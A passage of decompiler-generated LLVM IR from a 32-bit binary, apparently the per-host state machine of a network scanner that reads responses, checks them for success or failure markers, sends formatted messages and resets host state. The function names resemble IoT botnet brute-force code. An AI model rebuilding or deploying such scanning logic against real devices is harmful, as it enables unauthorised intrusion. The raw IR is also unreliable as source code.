  %v3_8052776 = inttoptr i32 %v0_8052741 to i32*
  store i32 %v0_8052776, i32* %v3_8052776, align 4
  %v2_8052777 = inttoptr i32 %v4_80526a9 to i32*
  %v3_8052777 = call i32 @advance_state(i32* %v2_8052777, i32 %stack_var_-624.289)
  store i32 %v3_8052777, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052784:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v1_805278f = add i32 %v2_8051fcd, 28
  store i32 %v1_805278f, i32* %eax.global-to-local, align 4
  %v1_8052792 = inttoptr i32 %v1_805278f to i32*
  %v2_8052792 = load i32, i32* %v1_8052792, align 4
  store i32 %v2_8052792, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_805279d = inttoptr i32 %v2_8051fcd to i32*
  %v4_805279d = load i32, i32* %v3_805279d, align 16
  store i32 %v4_805279d, i32* %eax.global-to-local, align 4
  %v0_80527a0 = load i32, i32* @esp, align 4
  %v1_80527a3 = add i32 %v0_80527a0, -16
  %v2_80527a3 = inttoptr i32 %v1_80527a3 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_806ff60.329 to i32), i32* %v2_80527a3, align 4
  %v1_80527a8 = add i32 %v0_80527a0, -20
  %v2_80527a8 = inttoptr i32 %v1_80527a8 to i32*
  store i32 1024, i32* %v2_80527a8, align 4
  %v0_80527ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80527ad = add i32 %v0_80527a0, -24
  %v3_80527ad = inttoptr i32 %v2_80527ad to i32*
  store i32 %v0_80527ad, i32* %v3_80527ad, align 4
  %v5_80527ae = add i32 %v0_80527a0, -28
  %v6_80527ae = inttoptr i32 %v5_80527ae to i32*
  store i32 %arg1, i32* %v6_80527ae, align 4
  %v0_80527b1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80527b1 = add i32 %v0_80527a0, -32
  %v3_80527b1 = inttoptr i32 %v2_80527b1 to i32*
  store i32 %v0_80527b1, i32* %v3_80527b1, align 4
  %v1_80527b2 = call i32 @read_until_response(i32 %v6_8052002)
  %v0_80527b7 = load i32, i32* @esp, align 4
  %v1_80527ba = icmp eq i32 %v1_80527b2, 0
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v1_8051fcf, i32* %eax.global-to-local, align 4
  br i1 %v1_80527ba, label %dec_label_pc_805290c, label %dec_label_pc_80527c2

dec_label_pc_80527c2:                             ; preds = %dec_label_pc_8052784
  store i32 0, i32* %v1_8051fd2, align 16
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v1_805278f, i32* %eax.global-to-local, align 4
  %v2_80527e4 = load i32, i32* %v1_8052792, align 4
  store i32 %v2_80527e4, i32* %eax.global-to-local, align 4
  %v0_80527e6 = load i32, i32* @esp, align 4
  %v2_80527e9 = add i32 %v0_80527e6, -16
  %v3_80527e9 = inttoptr i32 %v2_80527e9 to i32*
  store i32 %v2_80527e4, i32* %v3_80527e9, align 4
  %v1_80527ea = call i32 @contains_fail(i32 %stack_var_-628.288)
  store i32 %v1_80527ea, i32* %eax.global-to-local, align 4
  %v0_80527ef = load i32, i32* @esp, align 4
  %v1_80527f2 = icmp eq i32 %v1_80527ea, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_80527f2, label %dec_label_pc_8052815, label %dec_label_pc_80527f6

dec_label_pc_80527f6:                             ; preds = %dec_label_pc_80527c2
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8052805 = add i32 %v0_80527ef, 4
  %v2_8052805 = inttoptr i32 %v1_8052805 to i32*
  store i32 0, i32* %v2_8052805, align 4
  %v0_8052807 = load i32, i32* %eax.global-to-local, align 4
  %v3_8052807 = inttoptr i32 %v0_80527ef to i32*
  store i32 %v0_8052807, i32* %v3_8052807, align 4
  %v2_8052808 = inttoptr i32 %stack_var_-628.288 to i32*
  %v3_8052808 = call i32 @advance_state(i32* %v2_8052808, i32 %stack_var_-624.289)
  store i32 %v3_8052808, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052815:                             ; preds = %dec_label_pc_80527c2
  store i32 %v1_805278f, i32* %eax.global-to-local, align 4
  %v2_8052823 = load i32, i32* %v1_8052792, align 4
  store i32 %v2_8052823, i32* %eax.global-to-local, align 4
  %v3_8052828 = inttoptr i32 %v0_80527ef to i32*
  store i32 %v2_8052823, i32* %v3_8052828, align 4
  %v1_8052829 = call i32 @contains_success(i32 %stack_var_-628.288)
  store i32 %v1_8052829, i32* %eax.global-to-local, align 4
  %v0_805282e = load i32, i32* @esp, align 4
  %v1_8052831 = icmp eq i32 %v1_8052829, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_8052831, label %dec_label_pc_80528ef, label %dec_label_pc_8052839

dec_label_pc_8052839:                             ; preds = %dec_label_pc_8052815
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052842 = or i32 %v2_8051fca, 9
  %v3_8052842 = add i32 %v2_8052842, %v2_8051f36
  %v4_8052842 = inttoptr i32 %v3_8052842 to i8*
  %v5_8052842 = load i8, i8* %v4_8052842, align 1
  %v6_8052842 = zext i8 %v5_8052842 to i32
  %v9_8052842 = or i32 %v6_8052842, %v8_8052002
  store i32 %v9_8052842, i32* %eax.global-to-local, align 4
  %v10_8052846 = icmp eq i8 %v5_8052842, 2
  %v1_8052848 = icmp eq i1 %v10_8052846, false
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_8052848, label %dec_label_pc_8052869, label %dec_label_pc_805284a

dec_label_pc_805284a:                             ; preds = %dec_label_pc_8052839
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_8052859 = add i32 %v0_805282e, 4
  %v2_8052859 = inttoptr i32 %v1_8052859 to i32*
  store i32 7, i32* %v2_8052859, align 4
  %v0_805285b = load i32, i32* %eax.global-to-local, align 4
  %v3_805285b = inttoptr i32 %v0_805282e to i32*
  store i32 %v0_805285b, i32* %v3_805285b, align 4
  %v2_805285c = inttoptr i32 %stack_var_-628.288 to i32*
  %v3_805285c = call i32 @advance_state(i32* %v2_805285c, i32 %stack_var_-624.289)
  store i32 %v3_805285c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052869:                             ; preds = %dec_label_pc_8052839
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052872 = or i32 %v2_8051fca, 11
  %v3_8052872 = add i32 %v2_8052872, %v2_8051f36
  %v4_8052872 = inttoptr i32 %v3_8052872 to i8*
  %v5_8052872 = load i8, i8* %v4_8052872, align 1
  %v6_8052872 = zext i8 %v5_8052872 to i32
  store i32 %v6_8052872, i32* %eax.global-to-local, align 4
  %v1_805287b = mul nuw nsw i32 %v6_8052872, 4
  %v2_805287b = add nuw nsw i32 %v1_805287b, 134675744
  %v3_805287b = inttoptr i32 %v2_805287b to i32*
  %v4_805287b = load i32, i32* %v3_805287b, align 4
  store i32 %v4_805287b, i32* @ebx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_805288b = or i32 %v2_8051fca, 10
  %v3_805288b = add i32 %v2_805288b, %v2_8051f36
  %v4_805288b = inttoptr i32 %v3_805288b to i8*
  %v5_805288b = load i8, i8* %v4_805288b, align 2
  %v6_805288b = zext i8 %v5_805288b to i32
  store i32 %v6_805288b, i32* %eax.global-to-local, align 4
  %v1_8052894 = mul nuw nsw i32 %v6_805288b, 4
  %v2_8052894 = add nuw nsw i32 %v1_8052894, 134675328
  %v3_8052894 = inttoptr i32 %v2_8052894 to i32*
  %v4_8052894 = load i32, i32* %v3_8052894, align 4
  store i32 %v4_8052894, i32* @esi, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_80528aa = inttoptr i32 %v0_805282e to i32*
  store i32 %v2_8051fcd, i32* %v3_80528aa, align 4
  %v0_80528ab = call i32 @get_ipstate_host()
  store i32 %v0_80528ab, i32* %eax.global-to-local, align 4
  %v0_80528b0 = load i32, i32* @esp, align 4
  %v0_80528b3 = load i32, i32* @global_var_807e56c.330, align 4
  store i32 %v0_80528b3, i32* %edx.global-to-local, align 4
  %v0_80528bc = load i32, i32* @ebx, align 4
  %v2_80528bc = add i32 %v0_80528b0, 4
  %v3_80528bc = inttoptr i32 %v2_80528bc to i32*
  store i32 %v0_80528bc, i32* %v3_80528bc, align 4
  %v0_80528bd = load i32, i32* @esi, align 4
  %v3_80528bd = inttoptr i32 %v0_80528b0 to i32*
  store i32 %v0_80528bd, i32* %v3_80528bd, align 4
  %v2_80528be = add i32 %v0_80528b0, -4
  %v3_80528be = inttoptr i32 %v2_80528be to i32*
  store i32 %v0_80528ab, i32* %v3_80528be, align 4
  %v0_80528bf = load i32, i32* %edx.global-to-local, align 4
  %v2_80528bf = add i32 %v0_80528b0, -8
  %v3_80528bf = inttoptr i32 %v2_80528bf to i32*
  store i32 %v0_80528bf, i32* %v3_80528bf, align 4
  %v1_80528c0 = add i32 %v0_80528b0, -12
  %v2_80528c0 = inttoptr i32 %v1_80528c0 to i32*
  store i32 ptrtoint ([44 x i8]* @global_var_806a398.331 to i32), i32* %v2_80528c0, align 4
  %v5_80528c5 = add i32 %v0_80528b0, -16
  %v6_80528c5 = inttoptr i32 %v5_80528c5 to i32*
  store i32 %arg3, i32* %v6_80528c5, align 4
  %v2_80528c8 = call i32 @Send(i32 %stack_var_-628.288, i32 %stack_var_-624.289)
  %v0_80528cd = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_80528df = add i32 %v0_80528cd, 20
  %v2_80528df = inttoptr i32 %v1_80528df to i32*
  store i32 7, i32* %v2_80528df, align 4
  %v0_80528e1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80528e1 = add i32 %v0_80528cd, 16
  %v3_80528e1 = inttoptr i32 %v2_80528e1 to i32*
  store i32 %v0_80528e1, i32* %v3_80528e1, align 4
  %v2_80528e2 = inttoptr i32 %stack_var_-628.288 to i32*
  %v3_80528e2 = call i32 @advance_state(i32* %v2_80528e2, i32 %stack_var_-624.289)
  store i32 %v3_80528e2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_80528ef:                             ; preds = %dec_label_pc_8052815
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_80528fe = inttoptr i32 %v0_805282e to i32*
  store i32 %v2_8051fcd, i32* %v3_80528fe, align 4
  %v1_80528ff = call i32 @reset_ipstate(i32 %stack_var_-628.288)
  store i32 %v1_80528ff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_805290c:                             ; preds = %dec_label_pc_8052784
  %v2_805291a = load i32, i32* %v1_8051fd2, align 16
  store i32 %v2_805291a, i32* %eax.global-to-local, align 4
  %v1_805291c = add i32 %v2_805291a, 7
  store i32 %v1_805291c, i32* @ebx, align 4
  %v1_8052922 = add i32 %v0_80527b7, 16
  %v2_8052922 = inttoptr i32 %v1_8052922 to i32*
  store i32 0, i32* %v2_8052922, align 4
  %v1_8052924 = inttoptr i32 %stack_var_-628.288 to i32*
  %v2_8052924 = call i32 @__GI_time(i32* %v1_8052924)
  store i32 %v2_8052924, i32* %eax.global-to-local, align 4
  %v0_805292c = load i32, i32* @ebx, align 4
  %v7_805292c = icmp ult i32 %v0_805292c, %v2_8052924
  %v1_805292e = icmp eq i1 %v7_805292c, false
  br i1 %v1_805292e, label %dec_label_pc_8052d64, label %dec_label_pc_8052934

dec_label_pc_8052934:                             ; preds = %dec_label_pc_805290c
  %v0_8052929 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052943 = inttoptr i32 %v0_8052929 to i32*
  store i32 %v2_8051fcd, i32* %v3_8052943, align 4
  %v1_8052944 = call i32 @reset_ipstate(i32 %stack_var_-628.288)
  store i32 %v1_8052944, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_8052951:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8051fd2, align 16
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8052a02 = inttoptr i32 %v2_8051fcd to i32*
  %v0_8052971.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052971

dec_label_pc_8052971:                             ; preds = %dec_label_pc_8052a37, %dec_label_pc_8052951
  %v0_8052971 = phi i32 [ %v0_8052971.pre, %dec_label_pc_8052951 ], [ %v0_8052971108, %dec_label_pc_8052a37 ]
  %storemerge562 = phi i32 [ 0, %dec_label_pc_8052951 ], [ %v4_8052a37, %dec_label_pc_8052a37 ]
  %v1_8052974 = add i32 %v0_8052971, -8
  %v2_8052974 = inttoptr i32 %v1_8052974 to i32*
  store i32 128, i32* %v2_8052974, align 4
  %v1_8052979 = add i32 %v0_8052971, -12
  %v2_8052979 = inttoptr i32 %v1_8052979 to i32*
  store i32 0, i32* %v2_8052979, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_8052981 = add i32 %v0_8052971, -16
  %v3_8052981 = inttoptr i32 %v2_8052981 to i32*
  store i32 %v2_805297b, i32* %v3_8052981, align 4
  %v3_8052982 = inttoptr i32 %storemerge562 to i8*
  %v4_8052982 = call i32 @__GI_memset(i8* %v3_8052982, i32 %stack_var_-56.0, i32 %storemerge90)
  store i32 %storemerge562, i32* %eax.global-to-local, align 4
  %v1_805298d = mul nuw nsw i32 %storemerge562, 4
  %v2_805298d = add i32 %v1_805298d, ptrtoint ([4 x i8*]* @global_var_806ff8c.335 to i32)
  %v3_805298d = inttoptr i32 %v2_805298d to i32*
  %v4_805298d = load i32, i32* %v3_805298d, align 4
  store i32 %v4_805298d, i32* %edx.global-to-local, align 4
  store i32 %storemerge562, i32* %eax.global-to-local, align 4
  %v4_8052997 = load i32, i32* %v3_805298d, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80529a9 = and i32 %v4_8052997, -256
  store i32 %v1_80529a9, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80529ac = inttoptr i32 %v4_8052997 to i8*
  store i32 %v4_8052997, i32* @edi, align 4
  %v3_80529b2 = call i32 @_strlen(i8* %v4_80529ac)
  %v4_80529b2 = mul i32 %v3_80529b2, -1
  %v5_80529b2 = add i32 %v4_80529b2, -2
  store i32 %v5_80529b2, i32* %ecx.global-to-local, align 4
  %v1_80529b9 = sub i32 2, %v4_80529b2
  store i32 %v1_80529b9, i32* %eax.global-to-local, align 4
  %v0_80529bc = load i32, i32* %edx.global-to-local, align 4
  %v1_80529bc = load i32, i32* @esp, align 4
  %v2_80529bc = add i32 %v1_80529bc, -4
  %v3_80529bc = inttoptr i32 %v2_80529bc to i32*
  store i32 %v0_80529bc, i32* %v3_80529bc, align 4
  %v1_80529bd = add i32 %v1_80529bc, -8
  %v2_80529bd = inttoptr i32 %v1_80529bd to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_806a3c4.336 to i32), i32* %v2_80529bd, align 4
  %v0_80529c2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80529c2 = add i32 %v1_80529bc, -12
  %v3_80529c2 = inttoptr i32 %v2_80529c2 to i32*
  store i32 %v0_80529c2, i32* %v3_80529c2, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_80529c9 = add i32 %v1_80529bc, -16
  %v3_80529c9 = inttoptr i32 %v2_80529c9 to i32*
  store i32 %v2_805297b, i32* %v3_80529c9, align 4
  %v6_80529ca = load i32, i32* %stack_var_-608, align 4
  %v7_80529ca = call i32 @__GI_snprintf(i32 %v4_8052997, i32 %stack_var_-628.288, i32 %stack_var_-624.289, i32 %v2_8051f36, i32 %v6_8052002, i32 %v15_8051e38, i32 %v6_80529ca)
  store i32 %storemerge562, i32* %eax.global-to-local, align 4
  %v4_80529d5 = load i32, i32* %v3_805298d, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80529e7 = and i32 %v4_80529d5, -256
  store i32 %v1_80529e7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80529ea = inttoptr i32 %v4_80529d5 to i8*
  store i32 %v4_80529d5, i32* @edi, align 4
  %v3_80529f0 = call i32 @_strlen(i8* %v4_80529ea)
  store i32 %v3_80529f0, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052a02 = load i32, i32* %v3_8052a02, align 16
  store i32 %v4_8052a02, i32* %edx.global-to-local, align 4
  %v0_8052a05 = load i32, i32* @esp, align 4
  %v1_8052a05 = add i32 %v0_8052a05, -4
  %v2_8052a05 = inttoptr i32 %v1_8052a05 to i32*
  store i32 16384, i32* %v2_8052a05, align 4
  %v0_8052a0a = load i32, i32* @ecx, align 4
  %v2_8052a0a = add i32 %v0_8052a05, -8
  %v3_8052a0a = inttoptr i32 %v2_8052a0a to i32*
  store i32 %v0_8052a0a, i32* %v3_8052a0a, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_8052a11 = add i32 %v0_8052a05, -12
  %v3_8052a11 = inttoptr i32 %v2_8052a11 to i32*
  store i32 %v2_805297b, i32* %v3_8052a11, align 4
  %v0_8052a12 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052a12 = add i32 %v0_8052a05, -16
  %v3_8052a12 = inttoptr i32 %v2_8052a12 to i32*
  store i32 %v0_8052a12, i32* %v3_8052a12, align 4
  %v4_8052a13 = call i32 @send(i32 %v4_80529d5, i32 %v4_8052997, i32 %stack_var_-628.288, i32 %stack_var_-624.289)
  store i32 %v4_8052a13, i32* %eax.global-to-local, align 4
  %v0_8052a18 = load i32, i32* @esp, align 4
  %v2_8052a1b = icmp slt i32 %v4_8052a13, 0
  %v1_8052a1d = icmp eq i1 %v2_8052a1b, false
  br i1 %v1_8052a1d, label %dec_label_pc_8052a37, label %dec_label_pc_8052a1f

dec_label_pc_8052a1f:                             ; preds = %dec_label_pc_8052971
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v3_8052a2e = inttoptr i32 %v0_8052a18 to i32*
  store i32 %v2_8051fcd, i32* %v3_8052a2e, align 4
  %v1_8052a2f = call i32 @reset_ipstate(i32 %v4_80529d5)
  store i32 %v1_8052a2f, i32* %eax.global-to-local, align 4
  %v0_8052a34 = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052a37

dec_label_pc_8052a37:                             ; preds = %dec_label_pc_8052971, %dec_label_pc_8052a1f
  %v0_8052971108.in = phi i32 [ %v0_8052a18, %dec_label_pc_8052971 ], [ %v0_8052a34, %dec_label_pc_8052a1f ]
  %v0_8052971108 = add i32 %v0_8052971108.in, 16
  %v4_8052a37 = add nuw nsw i32 %storemerge562, 1
  store i32 %v4_8052a37, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8052a37, 5
  br i1 %exitcond, label %dec_label_pc_8052bb2.preheader, label %dec_label_pc_8052971

dec_label_pc_8052bb2.preheader:                   ; preds = %dec_label_pc_8052a37
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_8052bb869, label %dec_label_pc_8052a52, label %dec_label_pc_8052bbe

dec_label_pc_8052a52:                             ; preds = %dec_label_pc_8052bb2.preheader, %dec_label_pc_8052baf
  %v0_8052a52 = phi i32 [ %v0_8052a52111, %dec_label_pc_8052baf ], [ %v0_8052971108, %dec_label_pc_8052bb2.preheader ]
  %storemerge372 = phi i32 [ %v4_8052baf, %dec_label_pc_8052baf ], [ 0, %dec_label_pc_8052bb2.preheader ]
  %stack_var_-640.271 = phi i32 [ %stack_var_-640.1, %dec_label_pc_8052baf ], [ %stack_var_-640.485, %dec_label_pc_8052bb2.preheader ]
  %stack_var_-644.270 = phi i32 [ %stack_var_-644.1, %dec_label_pc_8052baf ], [ %stack_var_-644.484, %dec_label_pc_8052bb2.preheader ]
  %v1_8052a55 = add i32 %v0_8052a52, -8
  %v2_8052a55 = inttoptr i32 %v1_8052a55 to i32*
  store i32 128, i32* %v2_8052a55, align 4
  %v1_8052a5a = add i32 %v0_8052a52, -12
  %v2_8052a5a = inttoptr i32 %v1_8052a5a to i32*
  store i32 0, i32* %v2_8052a5a, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_8052a62 = add i32 %v0_8052a52, -16
  %v3_8052a62 = inttoptr i32 %v2_8052a62 to i32*
  store i32 %v2_805297b, i32* %v3_8052a62, align 4
  %v3_8052a63 = inttoptr i32 %storemerge372 to i8*
  %v4_8052a63 = call i32 @__GI_memset(i8* %v3_8052a63, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v4_8052a6b = icmp eq i32 %storemerge372, 0
  %v1_8052a6f = icmp eq i1 %v4_8052a6b, false
  store i32 %storemerge372, i32* %eax.global-to-local, align 4
  %v1_8052af0 = mul i32 %storemerge372, 4
  %v2_8052af0 = add i32 %v1_8052af0, ptrtoint ([7 x i8*]* @global_var_806ff20.344 to i32)
  %v3_8052af0 = inttoptr i32 %v2_8052af0 to i32*
  %v4_8052af0 = load i32, i32* %v3_8052af0, align 4
  store i32 %v4_8052af0, i32* %edx.global-to-local, align 4
  store i32 %storemerge372, i32* %eax.global-to-local, align 4
  %v4_8052afa = load i32, i32* %v3_8052af0, align 4
  store i32 %v4_8052afa, i32* @ebx, align 4
  store i32 %storemerge372, i32* %eax.global-to-local, align 4
  %v4_8052b04 = load i32, i32* %v3_8052af0, align 4
  store i32 %v4_8052b04, i32* @esi, align 4
  store i32 %storemerge372, i32* %eax.global-to-local, align 4
  %v4_8052b0e = load i32, i32* %v3_8052af0, align 4
  store i32 %v4_8052b0e, i32* %eax.global-to-local, align 4
  br i1 %v1_8052a6f, label %dec_label_pc_8052aed, label %dec_label_pc_8052a71

dec_label_pc_8052a71:                             ; preds = %dec_label_pc_8052a52
  store i32 %storemerge372, i32* %eax.global-to-local, align 4
  %v4_8052aa2 = load i32, i32* %v3_8052af0, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052ab4 = and i32 %v4_8052aa2, -256
  store i32 %v1_8052ab4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8052ab7 = inttoptr i32 %v4_8052aa2 to i8*
  store i32 %v4_8052aa2, i32* @edi, align 4
  %v3_8052abd = call i32 @_strlen(i8* %v4_8052ab7)
  %v4_8052abd = mul i32 %v3_8052abd, -1
  %v5_8052abd = add i32 %v4_8052abd, -2
  store i32 %v5_8052abd, i32* %ecx.global-to-local, align 4
  %v2_8052ac4 = mul i32 %v3_8052abd, 4
  %v1_8052ac7 = add i32 %v2_8052ac4, 58
  store i32 %v1_8052ac7, i32* %eax.global-to-local, align 4
  %v0_8052aca = load i32, i32* @esp, align 4
  %v0_8052acd = load i32, i32* %edx.global-to-local, align 4
  %v2_8052acd = add i32 %v0_8052aca, -8
  %v3_8052acd = inttoptr i32 %v2_8052acd to i32*
  store i32 %v0_8052acd, i32* %v3_8052acd, align 4
  %v0_8052ace = load i32, i32* @ebx, align 4
  %v2_8052ace = add i32 %v0_8052aca, -12
  %v3_8052ace = inttoptr i32 %v2_8052ace to i32*
  store i32 %v0_8052ace, i32* %v3_8052ace, align 4
  %v0_8052acf = load i32, i32* @esi, align 4
  %v2_8052acf = add i32 %v0_8052aca, -16
  %v3_8052acf = inttoptr i32 %v2_8052acf to i32*
  store i32 %v0_8052acf, i32* %v3_8052acf, align 4
  %v5_8052ad0 = add i32 %v0_8052aca, -20
  %v6_8052ad0 = inttoptr i32 %v5_8052ad0 to i32*
  store i32 %v4_8052b0e, i32* %v6_8052ad0, align 4
  %v1_8052ad6 = add i32 %v0_8052aca, -24
  %v2_8052ad6 = inttoptr i32 %v1_8052ad6 to i32*
  store i32 ptrtoint ([65 x i8]* @global_var_806a3cc.345 to i32), i32* %v2_8052ad6, align 4
  %v0_8052adb = load i32, i32* %eax.global-to-local, align 4
  %v2_8052adb = add i32 %v0_8052aca, -28
  %v3_8052adb = inttoptr i32 %v2_8052adb to i32*
  store i32 %v0_8052adb, i32* %v3_8052adb, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_8052ae2 = add i32 %v0_8052aca, -32
  %v3_8052ae2 = inttoptr i32 %v2_8052ae2 to i32*
  store i32 %v2_805297b, i32* %v3_8052ae2, align 4
  %v7_8052ae3 = call i32 @__GI_snprintf(i32 %v4_8052aa2, i32 %v4_80529d5, i32 %v4_8052997, i32 %stack_var_-628.288, i32 %stack_var_-624.289, i32 %v2_8051f36, i32 %v6_8052002)
  br label %dec_label_pc_8052b4e

dec_label_pc_8052aed:                             ; preds = %dec_label_pc_8052a52
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8052b20 = and i32 %v4_8052b0e, -256
  store i32 %v1_8052b20, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8052b23 = inttoptr i32 %v4_8052b0e to i8*
  store i32 %v4_8052b0e, i32* @edi, align 4
  %v3_8052b29 = call i32 @_strlen(i8* %v4_8052b23)
  %v4_8052b29 = mul i32 %v3_8052b29, -1
  %v5_8052b29 = add i32 %v4_8052b29, -2
  store i32 %v5_8052b29, i32* %ecx.global-to-local, align 4
  %v1_8052b30 = sub i32 24, %v4_8052b29
  store i32 %v1_8052b30, i32* %eax.global-to-local, align 4
  %v0_8052b33 = load i32, i32* @esp, align 4
  %v0_8052b36 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052b36 = add i32 %v0_8052b33, -12
  %v3_8052b36 = inttoptr i32 %v2_8052b36 to i32*
  store i32 %v0_8052b36, i32* %v3_8052b36, align 4
  %v0_8052b37 = load i32, i32* @ebx, align 4
  %v2_8052b37 = add i32 %v0_8052b33, -16
  %v3_8052b37 = inttoptr i32 %v2_8052b37 to i32*
  store i32 %v0_8052b37, i32* %v3_8052b37, align 4
  %v0_8052b38 = load i32, i32* @esi, align 4
  %v2_8052b38 = add i32 %v0_8052b33, -20
  %v3_8052b38 = inttoptr i32 %v2_8052b38 to i32*
  store i32 %v0_8052b38, i32* %v3_8052b38, align 4
  %v1_8052b39 = add i32 %v0_8052b33, -24
  %v2_8052b39 = inttoptr i32 %v1_8052b39 to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_806a40d.346 to i32), i32* %v2_8052b39, align 4
  %v0_8052b3e = load i32, i32* %eax.global-to-local, align 4
  %v2_8052b3e = add i32 %v0_8052b33, -28
  %v3_8052b3e = inttoptr i32 %v2_8052b3e to i32*
  store i32 %v0_8052b3e, i32* %v3_8052b3e, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_8052b45 = add i32 %v0_8052b33, -32
  %v3_8052b45 = inttoptr i32 %v2_8052b45 to i32*
  store i32 %v2_805297b, i32* %v3_8052b45, align 4
  %v7_8052b46 = call i32 @__GI_snprintf(i32 %v4_8052b0e, i32 %stack_var_-640.271, i32 %v4_80529d5, i32 %v4_8052997, i32 %stack_var_-628.288, i32 %stack_var_-624.289, i32 %v2_8051f36)
  br label %dec_label_pc_8052b4e

dec_label_pc_8052b4e:                             ; preds = %dec_label_pc_8052a71, %dec_label_pc_8052aed
  %storemerge114 = phi i32 [ %v7_8052ae3, %dec_label_pc_8052a71 ], [ %v7_8052b46, %dec_label_pc_8052aed ]
  %stack_var_-644.1 = phi i32 [ %stack_var_-644.270, %dec_label_pc_8052a71 ], [ %v4_8052b0e, %dec_label_pc_8052aed ]
  %stack_var_-640.1 = phi i32 [ %v4_8052aa2, %dec_label_pc_8052a71 ], [ %stack_var_-640.271, %dec_label_pc_8052aed ]
  store i32 %storemerge114, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052b5f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_805297b, i32* @edi, align 4
  %v3_8052b68 = call i32 @_strlen(i8* %v4_8052b62)
  store i32 %v3_8052b68, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052b7a = load i32, i32* %v3_8052a02, align 16
  store i32 %v4_8052b7a, i32* %edx.global-to-local, align 4
  %v0_8052b7d = load i32, i32* @esp, align 4
  %v1_8052b7d = add i32 %v0_8052b7d, -4
  %v2_8052b7d = inttoptr i32 %v1_8052b7d to i32*
  store i32 16384, i32* %v2_8052b7d, align 4
  %v0_8052b82 = load i32, i32* @ecx, align 4
  %v2_8052b82 = add i32 %v0_8052b7d, -8
  %v3_8052b82 = inttoptr i32 %v2_8052b82 to i32*
  store i32 %v0_8052b82, i32* %v3_8052b82, align 4
  store i32 %v2_805297b, i32* %eax.global-to-local, align 4
  %v2_8052b89 = add i32 %v0_8052b7d, -12
  %v3_8052b89 = inttoptr i32 %v2_8052b89 to i32*
  store i32 %v2_805297b, i32* %v3_8052b89, align 4
  %v0_8052b8a = load i32, i32* %edx.global-to-local, align 4
  %v2_8052b8a = add i32 %v0_8052b7d, -16
  %v3_8052b8a = inttoptr i32 %v2_8052b8a to i32*
